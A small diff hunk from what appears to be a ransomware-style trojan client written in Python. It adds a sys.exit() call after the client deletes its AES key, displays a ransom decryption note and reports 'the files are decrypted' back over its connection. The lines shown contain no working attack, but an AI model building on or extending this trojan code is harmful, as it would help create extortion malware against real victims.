@@ -155,6 +155,8 @@ class TrojanClient:
         del aes_key
         RansomNote.display_decryption_note()
         protocol.send(self.connection, "the files are decrypted")
+        
+        sys.exit()
 
 
 
